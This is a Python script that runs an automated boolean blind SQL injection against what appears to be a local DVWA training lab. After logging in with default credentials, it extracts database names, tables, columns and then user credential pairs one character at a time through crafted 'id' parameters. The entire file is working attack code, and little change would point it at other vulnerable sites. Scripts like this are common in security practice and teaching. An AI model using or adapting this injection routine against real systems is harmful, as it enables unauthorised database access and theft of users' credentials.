#!/usr/bin/python3

import requests,string,pdb,time
from bs4 import BeautifulSoup
from pwn import *

url = 'http://localhost:4280/'

chars = string.ascii_lowercase + ':,_'  + string.digits + '.'
headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'}

log.info('Requesting session on ' + url)
time.sleep(1)

s = requests.Session()
r = s.get(url + 'login.php', verify=False)
soup = BeautifulSoup(r.text, 'html.parser')
token = str(soup.find_all('input')[-1]).split('value="')[1].split('"')[0]
phpsessid_cookie = r.cookies.get('PHPSESSID')
data = dict(username='admin', password='password', Login='Login', user_token=token)
cookies = dict(PHPSESSID=phpsessid_cookie)

log.info('Obtained session data, logging in...')
time.sleep(1)

s.post(url + 'login.php', data=data, headers=headers, cookies=cookies, allow_redirects=True, verify=False)

sqliblind_url = 'vulnerabilities/sqli_blind/'
#/vulnerabilities/sqli_blind/?id=1&Submit=Submit
result = ''

print('')

p1 = log.progress('Obtaining databases')
#1' and (select substr(group_concat(schema_name),1,1) from information_schema.schemata) = 'c
i = 1
while True:
    for char in chars:
        p1.status(result + char)
        sqli = "1' and (select substr(group_concat(schema_name)," + str(i) + ",1) from information_schema.schemata) = '"
        r = s.get(url + sqliblind_url + '?id=' + sqli + char + '&Submit=Submit', cookies=cookies, headers=headers)
        if r.status_code == 200:
            result += char
            i += 1
            break
    if char == chars[-1] and result[-1] != char:
        p1.success(result)
        break

database = result.split(',')[1]

result = ''

print('')

p2 = log.progress('Obtaining tables from ' + database)
i = 1
while True:
    for char in chars:
        p2.status(result + char)
        sqli = "1' and (select substr(group_concat(table_name)," + str(i) + ",1) from information_schema.tables where table_schema='" + database + "') = '"
        r = s.get(url + sqliblind_url + '?id=' + sqli + char + '&Submit=Submit', cookies=cookies, headers=headers)
        if r.status_code == 200:
            result += char
            i += 1
            break
    if char == chars[-1] and result[-1] != char:
        p2.success(result)
        break

table = result.split(",")[0]

result = ''

print('')

p3 = log.progress('Obtaining columns from ' + table)
i = 1
while True:
    for char in chars:
        p3.status(result + char)
        sqli = "1' and (select substr(group_concat(column_name)," + str(i) + ",1) from information_schema.columns where table_name='" + table + "') = '"
        r = s.get(url + sqliblind_url + '?id=' + sqli + char + '&Submit=Submit', cookies=cookies, headers=headers)
        if r.status_code == 200:
            result += char
            i += 1
            break
    if char == chars[-1] and result[-1] != char:
        p3.success(result)
        break

column1 = result.split(',')[3]
column2 = result.split(',')[4]

result = ''

print('')

p4 = log.progress('Obtaining ' + column1 + ',' + column2 + ' from ' + table)
i = 1
while True:
    for char in chars:
        p4.status(result + char)
        sqli = "1' and (select substr(group_concat(" + column1 + ",0x3a," + column2 + ")," + str(i) + ",1) from " + table + ") = '"
        r = s.get(url + sqliblind_url + '?id=' + sqli + char + '&Submit=Submit', cookies=cookies, headers=headers)
        if r.status_code == 200:
            result += char
            i += 1
            break
    if char == chars[-1] and result[-1] != char:
        p4.success(result)
        break
